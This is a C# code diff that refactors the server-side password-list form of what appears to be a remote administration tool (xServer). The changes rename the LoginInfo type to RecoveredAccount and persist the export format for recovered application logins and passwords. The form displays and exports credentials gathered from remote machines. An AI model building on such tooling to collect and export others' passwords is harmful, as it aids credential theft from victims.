@@ -3,10 +3,10 @@ using System.Collections.Generic;
 using System.IO;
 using System.Text;
 using System.Windows.Forms;
+using xServer.Core.Data;
 using xServer.Core.Helper;
 using xServer.Core.Networking;
 using xServer.Core.Utilities;
-using xServer.Settings;
 
 namespace xServer.Forms
 {
@@ -47,7 +47,7 @@ namespace xServer.Forms
             }
         }
 
-        public void AddPassword(LoginInfo login, string identification)
+        public void AddPassword(RecoveredAccount login, string identification)
         {
             try
             {
@@ -99,7 +99,7 @@ namespace xServer.Forms
         #endregion
 
         #region Private Members
-        private string ConvertToFormat(string format, LoginInfo login)
+        private string ConvertToFormat(string format, RecoveredAccount login)
         {
             return format
                 .Replace("APP", login.Application)
@@ -117,14 +117,14 @@ namespace xServer.Forms
             {
                 foreach (ListViewItem lvi in lstPasswords.SelectedItems)
                 {
-                    sb.Append(ConvertToFormat(format, (LoginInfo)lvi.Tag));
+                    sb.Append(ConvertToFormat(format, (RecoveredAccount)lvi.Tag));
                 }
             }
             else
             {
                 foreach (ListViewItem lvi in lstPasswords.Items)
                 {
-                    sb.Append(ConvertToFormat(format, (LoginInfo)lvi.Tag));
+                    sb.Append(ConvertToFormat(format, (RecoveredAccount)lvi.Tag));
                 }
             }
           
@@ -146,6 +146,7 @@ namespace xServer.Forms
         private void txtFormat_TextChanged(object sender, EventArgs e)
         {
             XMLSettings.WriteValue("SaveFormat", txtFormat.Text);
+            XMLSettings.SaveFormat = txtFormat.Text;
         }
         #endregion
 
